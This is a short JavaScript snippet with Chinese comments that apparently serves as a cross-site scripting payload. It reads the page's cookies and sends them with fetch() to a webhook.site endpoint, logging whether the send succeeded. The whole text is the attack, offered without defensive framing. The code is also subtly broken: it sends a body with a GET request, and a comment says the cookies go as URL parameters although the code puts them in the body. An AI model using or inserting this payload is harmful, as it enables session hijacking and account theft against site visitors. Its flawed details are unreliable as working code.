fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d', {
    method: 'GET', // 使用 GET 方法發送請求
    headers: {
        'Content-Type': 'application/json'
    },
    // 將 cookies 作為 URL 參數發送
    body: JSON.stringify({
        cookie: document.cookie
    })
})
.then(response => {
    console.log('Cookie 已成功發送');
})
.catch(error => {
    console.error('發送 cookie 失敗:', error);
});
